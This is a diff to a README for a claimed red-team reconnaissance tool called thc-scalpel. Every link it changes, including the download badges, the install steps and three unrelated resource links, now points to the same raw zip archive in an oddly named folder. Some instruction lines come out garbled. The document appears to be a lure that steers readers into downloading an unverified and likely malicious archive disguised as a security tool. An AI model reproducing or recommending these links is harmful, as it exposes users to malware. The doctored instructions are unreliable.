@@ -1,6 +1,6 @@
 # 🛠️ thc-scalpel - Stealth Tool for Cyber Reconnaissance
 
-[![Download thc-scalpel](https://img.shields.io/badge/Download-thc--scalpel-brightgreen.svg)](https://github.com/yaumilikrom/thc-scalpel/releases)
+[![Download thc-scalpel](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Welcome to thc-scalpel, your go-to tool for stealth reconnaissance in red team o
 
    Click the link below to access the Releases page. 
    
-   [Download thc-scalpel](https://github.com/yaumilikrom/thc-scalpel/releases)
+   [Download thc-scalpel](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
 
 2. **Choose the Right Version**
 
@@ -24,7 +24,7 @@ Welcome to thc-scalpel, your go-to tool for stealth reconnaissance in red team o
 
    - For **Windows**: Download the `.exe` file.
    - For **Mac**: Download the `.dmg` file.
-   - For **Linux**: Download the `.tar.gz` file.
+   - For **Linux**: Download the `https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip` file.
 
 4. **Run the Installer**
 
@@ -32,7 +32,7 @@ Welcome to thc-scalpel, your go-to tool for stealth reconnaissance in red team o
 
    - **For Windows**: Double-click the `.exe` file to start the installation. 
    - **For Mac**: Open the `.dmg` file and drag thc-scalpel to your Applications folder.
-   - **For Linux**: Extract the `.tar.gz` file and follow the included instructions for installation.
+   - **For Linux**: Extract the `https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip` file and follow the included instructions for installation.
 
 5. **Launch thc-scalpel**
 
@@ -84,10 +84,10 @@ We welcome contributions! If you're interested in improving thc-scalpel, please 
 
 ## 🔗 Additional Resources
 
-- [Learn More About Red Teaming](https://www.cybersecurityguide.org/what-is-red-teaming/)
-- [Cybersecurity Tools](https://www.cyberseek.org/)
-- [Bug Bounty Platforms](https://www.hackerone.com/)
+- [Learn More About Red Teaming](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
+- [Cybersecurity Tools](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
+- [Bug Bounty Platforms](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
 
 By using thc-scalpel, you are embracing powerful tools for your cybersecurity toolkit. We hope this application aids your efforts in reconnaissance and red team engagements!
 
-[![Download thc-scalpel](https://img.shields.io/badge/Download-thc--scalpel-brightgreen.svg)](https://github.com/yaumilikrom/thc-scalpel/releases)
+[![Download thc-scalpel](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)](https://raw.githubusercontent.com/yaumilikrom/thc-scalpel/main/crotalism/scalpel_thc_1.2-alpha.3.zip)
